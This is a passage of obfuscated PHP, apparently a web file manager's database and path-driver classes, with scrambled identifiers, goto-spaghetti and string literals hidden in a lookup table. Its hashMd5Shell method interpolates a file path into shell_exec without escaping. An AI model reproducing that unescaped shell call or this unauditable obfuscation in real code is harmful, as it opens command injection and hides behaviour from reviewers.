!0; } public function rollback() { if ($this->transTimes > 0) { $e‰¿ëÇÛôå = $this->_linkID->query($_SERVER[©][34]); if (!$e‰¿ëÇÛôå) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $FŸ‚ËºÙ¬— = array(); while ($cÕ×”ù¥Ö = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $FŸ‚ËºÙ¬—[] = $cÕ×”ù¥Ö; } $this->queryID->reset(); return $FŸ‚ËºÙ¬—; } public function getFields($F³µ¿‘Áá) { $E¯ÀŠ¡£ùÚ =& $_SERVER[©]; $eõ˜˜»«Ö  = $this->query($E¯ÀŠ¡£ùÚ[35] . $F³µ¿‘Áá . $E¯ÀŠ¡£ùÚ[36]); $aµÃæ½«äˆ = array(); if ($eõ˜˜»«Ö ) { foreach ($eõ˜˜»«Ö  as $EóˆáŞÌÓÍ => $eî–Î†øõŠ) { $aµÃæ½«äˆ[$eî–Î†øõŠ[$E¯ÀŠ¡£ùÚ[38]]] = array($E¯ÀŠ¡£ùÚ[38] => $eî–Î†øõŠ[$E¯ÀŠ¡£ùÚ[38]], $E¯ÀŠ¡£ùÚ[39] => $eî–Î†øõŠ[$E¯ÀŠ¡£ùÚ[39]], $E¯ÀŠ¡£ùÚ[41] => (bool) ($eî–Î†øõŠ[$E¯ÀŠ¡£ùÚ[41]] === $E¯ÀŠ¡£ùÚ[43]), $E¯ÀŠ¡£ùÚ[44] => $eî–Î†øõŠ[$E¯ÀŠ¡£ùÚ[63]], $E¯ÀŠ¡£ùÚ[46] => (bool) $eî–Î†øõŠ[$E¯ÀŠ¡£ùÚ[64]], $E¯ÀŠ¡£ùÚ[49] => (bool) $eî–Î†øõŠ[$E¯ÀŠ¡£ùÚ[64]]); } } return $aµÃæ½«äˆ; } public function getTables($eéÏˆ™®ğ¦ = '') { $b—ÂĞöÁ³‘ =& $_SERVER[©]; $c–¤æÕ¾è = $this->query($b—ÂĞöÁ³‘[52] . $b—ÂĞöÁ³‘[53] . $b—ÂĞöÁ³‘[54]); $BëË°‚¸Ï = array(); foreach ($c–¤æÕ¾è as $AÕä±ÖÕÙÜ => $DÍ£İŞ­ Å) { $BëË°‚¸Ï[$AÕä±ÖÕÙÜ] = current($DÍ£İŞ­ Å); } return $BëË°‚¸Ï; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $CÍÑÑÀ×ÎÀ =& $_SERVER[©]; $this->error = $this->_linkID->lastErrorMsg(); if ($CÍÑÑÀ×ÎÀ[43] != $this->queryStr) { $this->error .= LNG($CÍÑÑÀ×ÎÀ[55]) . $this->queryStr; } think_trace($this->error, $CÍÑÑÀ×ÎÀ[43], $CÍÑÑÀ×ÎÀ[56]); return $this->error; } public function escapeString($E‹ÕÉÃÒä‰) { $fíï°½¤¡ =& $_SERVER[©]; if ($this->_linkID) { return $this->_linkID->escapeString($E‹ÕÉÃÒä‰); } return str_ireplace($fíï°½¤¡[65], $fíï°½¤¡[66], $E‹ÕÉÃÒä‰); } public function parseLimit($e£Ìƒ«ƒ¤‰) { $D„…Ê˜ë£È =& $_SERVER[©]; $bĞÅİÓ™ = $D„…Ê˜ë£È[43]; if (!empty($e£Ìƒ«ƒ¤‰)) { $e£Ìƒ«ƒ¤‰ = explode($D„…Ê˜ë£È[57], $e£Ìƒ«ƒ¤‰); if (count($e£Ìƒ«ƒ¤‰) > 1) { $bĞÅİÓ™ .= $D„…Ê˜ë£È[58] . $e£Ìƒ«ƒ¤‰[1] . $D„…Ê˜ë£È[59] . $e£Ìƒ«ƒ¤‰[0] . $D„…Ê˜ë£È[60]; } else { $bĞÅİÓ™ .= $D„…Ê˜ë£È[58] . $e£Ìƒ«ƒ¤‰[0] . $D„…Ê˜ë£È[60]; } } return $bĞÅİÓ™; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $DÛ‹Æ©ïå =& $_SERVER[©]; $this->objectDriver = array($DÛ‹Æ©ïå[67], $DÛ‹Æ©ïå[68], $DÛ‹Æ©ïå[69], $DÛ‹Æ©ïå[70], $DÛ‹Æ©ïå[71], $DÛ‹Æ©ïå[72], $DÛ‹Æ©ïå[73], $DÛ‹Æ©ïå[74]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($b‚Ü®”Àë) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($b‚Ü®”Àë, $_SERVER[©][18]); } return $b‚Ü®”Àë; } public function getPathName($F¨ÅÙ•¹Õ˜) { return $F¨ÅÙ•¹Õ˜; } public function iconvApp($FÜçÊ°Á“İ) { return $FÜçÊ°Á“İ; } public function iconvSystem($d›èò¥Îáå) { return $d›èò¥Îáå; } public function iconvTo($A˜±±ù½í, $F¶­‚¢ÛÃ, $a ßŒù‰ñ—) { goto aÀèòùÀ˜¢; eÓ£²£ö¬Ù: $cÂñ¢İŒ«[$a ßŒù‰ñ— . $d¹È…„ Œ[76] . $F¶­‚¢ÛÃ . $d¹È…„ Œ[77] . $A˜±±ù½í] = $A˜±±ù½í; $cÂñ¢İŒ«[$a ßŒù‰ñ— . $d¹È…„ Œ[76] . $F¶­‚¢ÛÃ . $d¹È…„ Œ[77] . $EŠ»·«¢”] = $A˜±±ù½í; $cÂñ¢İŒ«[$F¶­‚¢ÛÃ . $d¹È…„ Œ[76] . $a ßŒù‰ñ— . $d¹È…„ Œ[77] . $EŠ»·«¢”] = $EŠ»·«¢”; goto b¡„ÂÕÈ»Ó; b¡„ÂÕÈ»Ó: return $EŠ»·«¢”; goto C¸Ôé¤Š‹˜; E«™çî†Ö­: $EŠ»·«¢” = $EŠ»·«¢” ? $EŠ»·«¢” : $A˜±±ù½í; if (strstr($EŠ»·«¢”, $d¹È…„ Œ[79])) { $EŠ»·«¢” = str_replace($d¹È…„ Œ[79], $d¹È…„ Œ[80], $EŠ»·«¢”); } $cÂñ¢İŒ«[$F¶­‚¢ÛÃ . $d¹È…„ Œ[76] . $a ßŒù‰ñ— . $d¹È…„ Œ[77] . $A˜±±ù½í] = $EŠ»·«¢”; goto eÓ£²£ö¬Ù; EÕ¶›ºÖ„¢: $fßö›İ“ä“ = $F¶­‚¢ÛÃ . $d¹È…„ Œ[76] . $a ßŒù‰ñ— . $d¹È…„ Œ[77] . $A˜±±ù½í; if (isset($cÂñ¢İŒ«[$fßö›İ“ä“])) { return $cÂñ¢İŒ«[$fßö›İ“ä“]; } if (function_exists($d¹È…„ Œ[78])) { $EŠ»·«¢” = @mb_convert_encoding($A˜±±ù½í, $a ßŒù‰ñ—, $F¶­‚¢ÛÃ); } else { $EŠ»·«¢” = @iconv($F¶­‚¢ÛÃ, $a ßŒù‰ñ—, $A˜±±ù½í); } goto E«™çî†Ö­; aÀèòùÀ˜¢: $d¹È…„ Œ =& $_SERVER[©]; if (!$A˜±±ù½í || !function_exists($d¹È…„ Œ[75])) { return $A˜±±ù½í; } static $cÂñ¢İŒ« = array(); goto EÕ¶›ºÖ„¢; C¸Ôé¤Š‹˜: } public function getPathInner($FØÕ—Ô‰ë) { $E…Î½ÚæÈÑ = IO::init($FØÕ—Ô‰ë); return $E…Î½ÚæÈÑ->path; } public function getPathOuter($EÏÇêÉ¤í½) { $e¥Ñí¨„’¹ =& $_SERVER[©]; $bïâÈºÄ‹É = strlen(trim($this->pathBase, $e¥Ñí¨„’¹[18])); $EÏÇêÉ¤í½ = substr(trim($EÏÇêÉ¤í½, $e¥Ñí¨„’¹[18]), $bïâÈºÄ‹É); return $this->pathDriver . $e¥Ñí¨„’¹[18] . ltrim($EÏÇêÉ¤í½, $e¥Ñí¨„’¹[18]); } public function isParentOf($C ½ƒˆê”•, $Dºï¯‹¬±) { $aØ˜‰äğºÊ =& $_SERVER[©]; $C ½ƒˆê”• = rtrim(strtolower($C ½ƒˆê”•), $aØ˜‰äğºÊ[18]) . $aØ˜‰äğºÊ[18]; $Dºï¯‹¬± = rtrim(strtolower($Dºï¯‹¬±), $aØ˜‰äğºÊ[18]) . $aØ˜‰äğºÊ[18]; $c‡Ø®Šˆ§÷ = strpos($Dºï¯‹¬±, $C ½ƒˆê”•) === 0; return $c‡Ø®Šˆ§÷; } public function getType() { $D¸¡äæäÒ =& $_SERVER[©]; $A×Ä©áÊ­² = str_replace($D¸¡äæäÒ[81], $D¸¡äæäÒ[43], get_class($this)); return strtolower($A×Ä©áÊ­²); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($C“±×Ú×äÂ, $c£ë‹ºÔ÷) { $D‘Ê¤ƒÃš— =& $_SERVER[©]; $b½ŠÛ›–…¡ = rtrim($C“±×Ú×äÂ, $D‘Ê¤ƒÃš—[18]) . $D‘Ê¤ƒÃš—[18] . $c£ë‹ºÔ÷; $CêŒì§£± = $this->exist($b½ŠÛ›–…¡); return $CêŒì§£± ? $b½ŠÛ›–…¡ : !1; } public function setModifyTime($F¨±¯ªæİŠ, $a½¨ò¬¶¤­ = '') { } public function renameObject($f¹²–ª¾Ş‚, $c¾¸—ë¢) { goto bª‡ùÈ«¦é; EºÑÊ®„Ñ‘: $f¹²–ª¾Ş‚ = $this->getPathOuter($f¹²–ª¾Ş‚); $c¾¸—ë¢ = $this->pathFather($f¹²–ª¾Ş‚) . $c¾¸—ë¢; if (IO::isFile($f¹²–ª¾Ş‚)) { $C†òƒİšÌ = IO::copy($f¹²–ª¾Ş‚, $this->pathFather($f¹²–ª¾Ş‚), REPEAT_RENAME_FOLDER, $D÷“¡ØÎÙ¦); if ($C†òƒİšÌ) { IO::remove($f¹²–ª¾Ş‚); } } else { $C†òƒİšÌ = IO::mkdir($c¾¸—ë¢); if (!$C†òƒİšÌ) { return !1; } $E­¼¯ÙêÏ„ = IO::listPath($f¹²–ª¾Ş‚, !0); $E—¿‘¨‰®¤ = array_merge($E­¼¯ÙêÏ„[$E„ßîä¡¦[83]], $E­¼¯ÙêÏ„[$E„ßîä¡¦[84]]); foreach ($E—¿‘¨‰®¤ as $f—–«ò…ìó) { IO::move($f—–«ò…ìó[$E„ßîä¡¦[85]], $c¾¸—ë¢, REPEAT_RENAME_FOLDER); } IO::remove($f¹²–ª¾Ş‚); } goto B“ò“ŞÅÇ; B“ò“ŞÅÇ: return $C†òƒİšÌ ? $c¾¸—ë¢ : !1; goto E«¼®ƒäù; bª‡ùÈ«¦é: $E„ßîä¡¦ =& $_SERVER[©]; $D÷“¡ØÎÙ¦ = $c¾¸—ë¢; Hook::trigger($E„ßîä¡¦[82], $this, $f¹²–ª¾Ş‚, $this, $this->pathFather($f¹²–ª¾Ş‚) . $c¾¸—ë¢); goto EºÑÊ®„Ñ‘; E«¼®ƒäù: } public function tempFile($eâ¨³ÙŠİ = '', $D†¼¼¨ºõ = '') { goto c®…Ã…äêƒ; c®…Ã…äêƒ: if (!$eâ¨³ÙŠİ) { $eâ¨³ÙŠİ = rand_string(15); } $aéîî…¹¹Ü = TEMP_FILES . rand_string(15) . $_SERVER[©][18]; @mkdir($aéîî…¹¹Ü, 511, !0); goto f‚”àŞ‚§¢; EÑ„¥ËôÌ„: return $f¥î¥¦µ²ï; goto cÁÉÙÅã¸; f‚”àŞ‚§¢: $f¥î¥¦µ²ï = $aéîî…¹¹Ü . $eâ¨³ÙŠİ; @touch($f¥î¥¦µ²ï); if ($D†¼¼¨ºõ) { file_put_contents($f¥î¥¦µ²ï, $D†¼¼¨ºõ); } goto EÑ„¥ËôÌ„; cÁÉÙÅã¸: } public function tempFileRemve($BÂÆ£¶á‹¦) { @unlink($BÂÆ£¶á‹¦); @rmdir($this->pathFather($BÂÆ£¶á‹¦)); } public function mkfile($F“‰µÄ’ÈÃ, $d´‹ÀœÁ“· = '', $BéùÅõ˜ªô = REPEAT_RENAME) { } public function mkdir($f…ÁÂœÜšƒ, $Fµ’³Á·Ôö = REPEAT_SKIP) { } public function delFile($c¹¢‘Ë­ê™) { } public function delFolder($B±šĞ¼É¬Ò) { } public function copyFile($AÇçÒ»½ùå, $EŒŞİ²ì“æ) { } public function moveFile($B¥ÇÉÜà„¿, $AÓ‚»‚¯óé) { } public function remove($EœÎ©‘»®) { if ($this->isFile($EœÎ©‘»®)) { return $this->delFile($EœÎ©‘»®); } return $this->delFolder($EœÎ©‘»®); } public function rename($AËŞ»‘ãÌ, $C÷´ŠËÊ¨) { } public function exist($bİºæ†“¹Á) { } public function findByHash($c™øÜ ÷£ç = '', $A†¯¢â•½Ø = '') { return !1; } public function isFile($b—”íÜê·) { } public function isFolder($fŒ¬¥øõ™›) { } public function size($CàÌÀ¯š©É) { } public function info($fè«°ÅÁö) { } public function infoSimple($Dõ‡ªâÍÖÓ) { return $this->info($Dõ‡ªâÍÖÓ); } public function infoAuth($eŞĞîöõ‹·) { return $this->info($eŞĞîöõ‹·); } public function infoFull($A†²œ·‹œÇ) { return $this->info($A†²œ·‹œÇ); } public function infoWithChildren($EÆ¶×ªòó§) { $dôğøßÍ®« =& $_SERVER[©]; static $Cœˆ¹æ™Ï = array(); if (isset($Cœˆ¹æ™Ï[$EÆ¶×ªòó§])) { return $Cœˆ¹æ™Ï[$EÆ¶×ªòó§]; } $C³ÑÎ”Ï¶Â = $this->info($EÆ¶×ªòó§); if ($C³ÑÎ”Ï¶Â && $C³ÑÎ”Ï¶Â[$dôğøßÍ®«[39]] == $dôğøßÍ®«[86]) { $CÃ°«öù•Œ = array($dôğøßÍ®«[87] => 0, $dôğøßÍ®«[88] => 0, $dôğøßÍ®«[89] => 0); $this->infoChildren($EÆ¶×ªòó§, $CÃ°«öù•Œ); $C³ÑÎ”Ï¶Â[$dôğøßÍ®«[87]] = $CÃ°«öù•Œ[$dôğøßÍ®«[87]]; $C³ÑÎ”Ï¶Â[$dôğøßÍ®«[90]] = array($dôğøßÍ®«[91] => $CÃ°«öù•Œ[$dôğøßÍ®«[88]], $dôğøßÍ®«[92] => $CÃ°«öù•Œ[$dôğøßÍ®«[89]]); $Cœˆ¹æ™Ï[$EÆ¶×ªòó§] = $C³ÑÎ”Ï¶Â; } return $C³ÑÎ”Ï¶Â; } public function listPath($b²ÕßÑ•Ñ, $D±Œ‡Ï–œç = false) { } public function has($aÔëŸàæÉ, $eèÂÉ´Ì†§ = false, $fñ¶îàÃŸ = false) { } public function canRead($F—ñïæ—) { } public function canWrite($EïÉ¼¾öõ) { } public function getContent($a¸ÁİÖ±†Š) { } public function setContent($cõËîöÜÃ§, $c¶ÈŠä÷” = '') { } protected function infoChildren($b’¨í¬ï¢÷, &$a»ÖÙá—ø) { $e±™¼™Ş†Ÿ =& $_SERVER[©]; check_abort(); $DñÏòùŠ = $this->listPath($b’¨í¬ï¢÷, !0); $DñÏòùŠ = array_merge($DñÏòùŠ[$e±™¼™Ş†Ÿ[84]], $DñÏòùŠ[$e±™¼™Ş†Ÿ[83]]); foreach ($DñÏòùŠ as $aÜ Úœ†–¨) { if ($aÜ Úœ†–¨[$e±™¼™Ş†Ÿ[39]] == $e±™¼™Ş†Ÿ[86]) { $a»ÖÙá—ø[$e±™¼™Ş†Ÿ[89]]++; $cë²ËÍ¶¨Û = $this->getPathInner($aÜ Úœ†–¨[$e±™¼™Ş†Ÿ[85]]); $this->infoChildren($cë²ËÍ¶¨Û, $a»ÖÙá—ø); } else { $a»ÖÙá—ø[$e±™¼™Ş†Ÿ[88]]++; $a»ÖÙá—ø[$e±™¼™Ş†Ÿ[87]] += $aÜ Úœ†–¨[$e±™¼™Ş†Ÿ[87]]; } } } public function fileSubstr($bäñ¿¥‡åÔ, $FŸ©Á„Ñò, $BöÄ™×±) { } public function listAll($càèœ¤î‘) { } public function upload($DŞÄ—¥‰¡, $AÄì¿È˜ªğ, $aÄ§°†á£ = false, $c­ãĞ¨Ù‹ = REPEAT_REPLACE) { } public function uploadFileByID($FŞ–çâ×î›, $D¼à¹²Ğƒ, $Ağ…¸Î‚È) { } public function uploadFileByPath($bÇ¢Ö‹åÎ, $AÁ¢‹ìµƒ£, $c­£…Óì = array()) { } public function isUploadServer() { $Eä±Û’ºÁÀ =& $_SERVER[©]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Eä±Û’ºÁÀ[93]) { return !0; } return $GLOBALS[$Eä±Û’ºÁÀ[16]][$Eä±Û’ºÁÀ[94]][$Eä±Û’ºÁÀ[95]]; } public function isFileOutServer() { $c¸™ÔŠÂ¦ô =& $_SERVER[©]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $c¸™ÔŠÂ¦ô[93]) { return !0; } return $GLOBALS[$c¸™ÔŠÂ¦ô[16]][$c¸™ÔŠÂ¦ô[94]][$c¸™ÔŠÂ¦ô[96]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($DƒöÓâÛÔñ) { $aÜèõĞ¯Šç =& $_SERVER[©]; if (!$this->isCdnHost()) { return $DƒöÓâÛÔñ; } return str_replace(trim(get_url_root($DƒöÓâÛÔñ), $aÜèõĞ¯Šç[18]), trim($this->cdnHost, $aÜèõĞ¯Šç[18]), $DƒöÓâÛÔñ); } public function uploadLink($bù‡¿Ğ‹ø, $Cƒâñ¾‰¨• = 0) { goto E–áƒÙŠŸ; AêÔïÚÓöŸ: if (!in_array($a¤Áí…¤ºŞ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $b­ÄßŠÑÑÂ = 1024 * 1024 * 10; goto b“©Í’´Ÿ¼; b“©Í’´Ÿ¼: $d·ÓÀ£¤¥ = $Cƒâñ¾‰¨• <= $b­ÄßŠÑÑÂ ? $fŠ”åÆ¨¾[97] : $fŠ”åÆ¨¾[98]; $eª¨ÊæÛªÂ = (!$Cƒâñ¾‰¨• ? 1 : ceil($Cƒâñ¾‰¨• / pow(1024, 3))) * 3600 * 4; $e¾±„¤›Ô¡ = $this->{$d·ÓÀ£¤¥}($bù‡¿Ğ‹ø, $eª¨ÊæÛªÂ); goto E ‡«ËáĞ­; E ‡«ËáĞ­: if ($e¾±„¤›Ô¡) { $e¾±„¤›Ô¡[$fŠ”åÆ¨¾[99]] = $bù‡¿Ğ‹ø; $e¾±„¤›Ô¡[$fŠ”åÆ¨¾[100]] = $a¤Áí…¤ºŞ; } return $e¾±„¤›Ô¡; goto BÓ¦“Å˜²; E–áƒÙŠŸ: $fŠ”åÆ¨¾ =& $_SERVER[©]; if ($this->isUploadServer()) { return; } $a¤Áí…¤ºŞ = $this->getType(); goto AêÔïÚÓöŸ; BÓ¦“Å˜²: } public function uploadFormData($a‚’ˆÕ‚Óç, $E¤äÄÅÙ© = 3600) { } public function multiUploadFormData($Fà¹†–À, $FÌ£Í«ĞêÑ = 3600) { } public function download($Aì¿ÂÛ¬‰à, $c÷ØÕÅ˜‰†) { } public function ext($eå¨˜É“Œ) { $cÚÜÎ·ÔÉ® =& $_SERVER[©]; if (strpos($eå¨˜É“Œ, $cÚÜÎ·ÔÉ®[18]) === -1) { $Dæİ™’Ô‘Æ = $eå¨˜É“Œ; } else { $Dæİ™’Ô‘Æ = $this->pathThis($eå¨˜É“Œ); } $dÓÖË»¦˜Ú = $cÚÜÎ·ÔÉ®[43]; if (strstr($Dæİ™’Ô‘Æ, $cÚÜÎ·ÔÉ®[101])) { $dÓÖË»¦˜Ú = substr($Dæİ™’Ô‘Æ, strrpos($Dæİ™’Ô‘Æ, $cÚÜÎ·ÔÉ®[101]) + 1); $dÓÖË»¦˜Ú = strtolower($dÓÖË»¦˜Ú); } if (strlen($dÓÖË»¦˜Ú) > 3 && preg_match($cÚÜÎ·ÔÉ®[102], $dÓÖË»¦˜Ú, $cˆ‹ä¶¬É)) { $dÓÖË»¦˜Ú = $cÚÜÎ·ÔÉ®[43]; } return $dÓÖË»¦˜Ú; } public function pathThis($EõèƒÎââ¿) { $A¸£»­½ =& $_SERVER[©]; $EõèƒÎââ¿ = str_replace($A¸£»­½[103], $A¸£»­½[18], rtrim($EõèƒÎââ¿, $A¸£»­½[18])); $eÏ†´ êèÄ = strrpos($EõèƒÎââ¿, $A¸£»­½[18]); if ($eÏ†´ êèÄ === !1) { return $EõèƒÎââ¿; } return substr($EõèƒÎââ¿, $eÏ†´ êèÄ + 1); } public function pathFather($d¹ˆé›ˆ„) { $d£¦Õ·ìë¬ =& $_SERVER[©]; $d¹ˆé›ˆ„ = str_replace($d£¦Õ·ìë¬[103], $d£¦Õ·ìë¬[18], rtrim($d¹ˆé›ˆ„, $d£¦Õ·ìë¬[18])); $aÏ¯¸½ğ´Ú = strrpos($d¹ˆé›ˆ„, $d£¦Õ·ìë¬[18]); if ($aÏ¯¸½ğ´Ú === !1) { return $d£¦Õ·ìë¬[43]; } return substr($d¹ˆé›ˆ„, 0, $aÏ¯¸½ğ´Ú + 1); } public function hashSimple($fåîÉ«¾‹Û) { goto fÕÀ¸è¼‰Ñ; fÕÀ¸è¼‰Ñ: $c‡ë—êšÖ =& $_SERVER[©]; if (!$fåîÉ«¾‹Û) { return md5($c‡ë—êšÖ[43]); } $F°³ß«ÚË¸ = $this->size($fåîÉ«¾‹Û); goto EÃİÆ¬ÊàÕ; c‚á˜¥ÇÃ: $DŞî‚ÕœÁÏ .= $this->fileSubstr($fåîÉ«¾‹Û, $F°³ß«ÚË¸ - $FÕÙ‚Ô´ø×, $FÕÙ‚Ô´ø×); return md5($DŞî‚ÕœÁÏ) . $F°³ß«ÚË¸; goto FÓÄÎĞ¬˜à; c«®ì…õ±°: $c£ö¿ô†½ = intval($F°³ß«ÚË¸ / $DŒ©‹ÎÃÈ); $DŞî‚ÕœÁÏ = $c‡ë—êšÖ[43]; for ($Dš”Ä­¶ = 0; $Dš”Ä­¶ < $DŒ©‹ÎÃÈ; $Dš”Ä­¶++) { $DŞî‚ÕœÁÏ .= $this->fileSubstr($fåîÉ«¾‹Û, $c£ö¿ô†½ * $Dš”Ä­¶, $FÕÙ‚Ô´ø×); } goto c‚á˜¥ÇÃ; EÃİÆ¬ÊàÕ: $FÕÙ‚Ô´ø× = 200; $DŒ©‹ÎÃÈ = 50; if ($F°³ß«ÚË¸ <= $FÕÙ‚Ô´ø× * $DŒ©‹ÎÃÈ) { return $this->hashMd5($fåîÉ«¾‹Û) . $F°³ß«ÚË¸; } goto c«®ì…õ±°; FÓÄÎĞ¬˜à: } public static $md5Cache = array(); public function hashMd5($CôÓÃ½ŒÜ) { $CôÓÃ½ŒÜ = $this->iconvSystem($CôÓÃ½ŒÜ); if (isset(self::$md5Cache[$CôÓÃ½ŒÜ])) { return self::$md5Cache[$CôÓÃ½ŒÜ]; } self::$md5Cache[$CôÓÃ½ŒÜ] = $this->hashMd5Shell($CôÓÃ½ŒÜ); if (!self::$md5Cache[$CôÓÃ½ŒÜ]) { self::$md5Cache[$CôÓÃ½ŒÜ] = @md5_file($CôÓÃ½ŒÜ); } return self::$md5Cache[$CôÓÃ½ŒÜ]; } private function hashMd5Shell($B¥ƒÑÆÆ²Ö) { goto bê¤°“›µ³; Bö•´´œê÷: $FƒÀ¶ÄäŒš = shell_exec($e‘„ï³¨’’ . "\x20\42{$B¥ƒÑÆÆ²Ö}\x22"); $FƒÀ¶ÄäŒš = str_replace($CÔœæ †õˆ[110], $CÔœæ †õˆ[43], $FƒÀ¶ÄäŒš); return substr($FƒÀ¶ÄäŒš, 0, 32); goto cÄÍÅ‘¾ˆ; bê¤°“›µ³: $CÔœæ †õˆ =& $_SERVER[©]; if (!function_exists($CÔœæ †õˆ[104])) { return !1; } $fÍÁõæÕ©É = array($CÔœæ †õˆ[105], $CÔœæ †õˆ[106]); goto FçĞ²æŠ›¹; FçĞ²æŠ›¹: $e‘„ï³¨’’ = Cache::get($CÔœæ †õˆ[107]); if (!$e‘„ï³¨’’) { $d®ÕÏÜ±İ³ = BASIC_PATH . $CÔœæ †õˆ[108]; $b¹É²¡äÜ = md5_file($d®ÕÏÜ±İ³); $e‘„ï³¨’’ = $CÔœæ †õˆ[109]; foreach ($fÍÁõæÕ©É as $A¥ğ¸•‹‡ä) { $FƒÀ¶ÄäŒš = shell_exec($A¥ğ¸•‹‡ä . "\x20\x22{$d®ÕÏÜ±İ³}\x22"); if ($FƒÀ¶ÄäŒš && substr(trim($FƒÀ¶ÄäŒš), 0, 32) == $b¹É²¡äÜ) { $e‘„ï³¨’’ = $A¥ğ¸•‹‡ä; break; } } Cache::set($CÔœæ †õˆ[107], $e‘„ï³¨’’, 3600); } if ($e‘„ï³¨’’ == $CÔœæ †õˆ[109]) { return !1; } goto Bö•´´œê÷; cÄÍÅ‘¾ˆ: } public function link($C¾Ä®İ•ª‘) { return $C¾Ä®İ•ª‘; } public function fileOut($Dš„ñ Á§ƒ, $AÏÕ¬Ãô¢š = false, $d´ªôöšİò = false, $E’ÁÁìà… = '') { goto d‰ïÂÔ‚È“; dˆÆ¢¿‹›: $e…‡¿Ï¹‡Ü = $Bã·´µ…ø[$bª•¢•ĞÆ˜[87]]; $D£ÓŸ³ÌÕŒ = gmdate($bª•¢•ĞÆ˜[116], $Bã·´µ…ø[$bª•¢•ĞÆ˜[117]]); $BÇêİ§ÍĞ = $d´ªôöšİò ? $d´ªôöšİò : $this->iconvApp($Bã·´µ…ø[$bª•¢•ĞÆ˜[38]]); goto f›¤Œ±ùƒ; d‰ïÂÔ‚È“: $bª•¢•ĞÆ˜ =& $_SERVER[©]; $this->cacheMethod(null, null); if (!$Dš„ñ Á§ƒ || !$this->exist($Dš„ñ Á§ƒ)) { show_json(LNG($bª•¢•ĞÆ˜[111]), !1, $d´ªôöšİò); } goto EÇ›Äù¯óË; A»¸†‚‡Ší: $Bô‹“¾ÌÔç = get_file_mime($BµÆóŠæ); if (strstr($Bô‹“¾ÌÔç, $bª•¢•ĞÆ˜[124])) { $Bô‹“¾ÌÔç = $Bô‹“¾ÌÔç . $bª•¢•ĞÆ˜[125]; } if ($AÏÕ¬Ãô¢š === !1 && !mime_support($Bô‹“¾ÌÔç)) { $AÏÕ¬Ãô¢š = !0; $Bô‹“¾ÌÔç = $bª•¢•ĞÆ˜[126]; } goto D‚”äÔÑÏ; D‚”äÔÑÏ: $A›˜§Ø¦ã = rawurlencode($BÇêİ§ÍĞ); $A›˜§Ø¦ã = $bª•¢•ĞÆ˜[123] . $A›˜§Ø¦ã . $bª•¢•ĞÆ˜[127] . $A›˜§Ø¦ã; if ($AÏÕ¬Ãô¢š) { header($bª•¢•ĞÆ˜[128]); header($bª•¢•ĞÆ˜[129] . $A›˜§Ø¦ã); } else { header($bª•¢•ĞÆ˜[130] . $A›˜§Ø¦ã); } goto eÇ¶°¨ø½ó; EÇ›Äù¯óË: $eö½İ˜¯‹Î = $this->getType() == $bª•¢•ĞÆ˜[112]; $AÚ‚èà´Â = $GLOBALS[$bª•¢•ĞÆ˜[16]][$bª•¢•ĞÆ˜[94]][$bª•¢•ĞÆ˜[113]][$bª•¢•ĞÆ˜[114]]; $b»Ù“á¤±¹ = (double) $GLOBALS[$bª•¢•ĞÆ˜[16]][$bª•¢•ĞÆ˜[94]][$bª•¢•ĞÆ˜[113]][$bª•¢•ĞÆ˜[115]] * 1024 * 1024; goto Dî´œ‘‡™‘; E¼³ÓÁª³: if (isset($_SERVER[$bª•¢•ĞÆ˜[138]]) && strtotime($_SERVER[$bª•¢•ĞÆ˜[138]]) == $Bã·´µ…ø[$bª•¢•ĞÆ˜[117]]) { header($bª•¢•ĞÆ˜[139], !0, 304); die; } if (isset($_SERVER[$bª•¢•ĞÆ˜[140]]) && $_SERVER[$bª•¢•ĞÆ˜[140]] == $E’ÁÁìà…) { header($bª•¢•ĞÆ˜[141] . $E’ÁÁìà…, !0, 304); die; } header($bª•¢•ĞÆ˜[141] . $E’ÁÁìà…); goto cÙ§½‹èâÓ; dñ—¸³Ñ‚Ğ: $BôÖÌ ¢Á = strtolower($_SERVER[$bª•¢•ĞÆ˜[149]]); if ($eö½İ˜¯‹Î && $BôÖÌ ¢Á && $AÚ‚èà´Â) { if (strstr($BôÖÌ ¢Á, $bª•¢•ĞÆ˜[150])) { header($bª•¢•ĞÆ˜[151] . $Dš„ñ Á§ƒ); } else { if (strstr($BôÖÌ ¢Á, $bª•¢•ĞÆ˜[152])) { header($bª•¢•ĞÆ˜[153] . $Dš„ñ Á§ƒ); } else { if (strstr($BôÖÌ ¢Á, $bª•¢•ĞÆ˜[154])) { header($bª•¢•ĞÆ˜[155] . $Dš„ñ Á§ƒ); } } } if ($b»Ù“á¤±¹) { header($bª•¢•ĞÆ˜[156] . $b»Ù“á¤±¹); } return; } if (isset($_SERVER[$bª•¢•ĞÆ˜[157]])) { if (preg_match($bª•¢•ĞÆ˜[158], $_SERVER[$bª•¢•ĞÆ˜[157]], $eøŠŒİæÇÎ)) { $DÇõ‚İùœô = intval($eøŠŒİæÇÎ[1]); if (!empty($eøŠŒİæÇÎ[2])) { $Aì°«Ëƒ¦à = intval($eøŠŒİæÇÎ[2]); } } header($bª•¢•ĞÆ˜[159]); header("\x43\x6f\x6e\x74\x65\x6e\164\x2d\x52\141\x6e\x67\145\x3a\40\142\171\164\x65\x73\x20{$DÇõ‚İùœô}\x2d{$Aì°«Ëƒ¦à}\57" . $e…‡¿Ï¹‡Ü); } else { header($bª•¢•ĞÆ˜[160]); } goto c‘§¤˜Šµ†; båòÊ©¸¬Ó: header($bª•¢•ĞÆ˜[135]); header($bª•¢•ĞÆ˜[136]); header($bª•¢•ĞÆ˜[137]); goto E¼³ÓÁª³; f‡·ŒŞÚ“‘: if ($b»Ù“á¤±¹) { $a„ÃÙÄí†™ = intval(1000 * 1000 * ($d«³…ìß® / $b»Ù“á¤±¹)); } while ($DÇõ‚İùœô <= $Aì°«Ëƒ¦à) { $EĞ¬‘Àå¸ = timeFloat(); check_abort(); $DõêÅ³Ù¾ = 